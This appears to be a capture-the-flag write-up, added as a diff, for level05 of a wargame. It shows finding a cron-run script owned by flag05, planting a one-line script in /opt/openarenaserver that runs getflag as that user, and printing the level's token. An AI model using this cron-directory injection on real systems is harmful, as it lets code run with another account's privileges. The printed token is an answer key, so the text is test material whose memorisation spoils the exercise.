@@ -1,0 +1,59 @@
+From the level05 account, the goal was to execute getflag with the privileges of the flag05 account.
+
+The home directory did not contain any useful file, so I searched for files owned by flag05:
+
+find / -user flag05 2>/dev/null
+
+Interesting results:
+
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+I inspected the script:
+
+cat /usr/sbin/openarenaserver
+
+Content:
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+The script loops over every file in /opt/openarenaserver, executes each one with bash, then removes it.
+
+I checked its permissions:
+
+ls -la /usr/sbin/openarenaserver
+
+Output:
+
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+
+I could read the file, but I could not execute it directly because it is owned by flag05 and restricted to the flag05 group.
+
+The important clue is that this script is designed to process files from /opt/openarenaserver automatically.
+Since I cannot execute it myself, it must be executed by another mechanism, most likely a periodic job such as cron.
+
+The exploit is to place a script in /opt/openarenaserver that writes the output of getflag to a readable file in /tmp.
+
+I created the payload:
+
+echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/exploit.sh
+chmod +x /opt/openarenaserver/exploit.sh
+
+After waiting for the periodic job to run, the script was executed with flag05 privileges and removed by openarenaserver.
+
+I then read the output file:
+
+cat /tmp/flag05
+
+Output:
+
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+Token obtained to access the next level:
+
+viuaaale9huek52boumoomioc
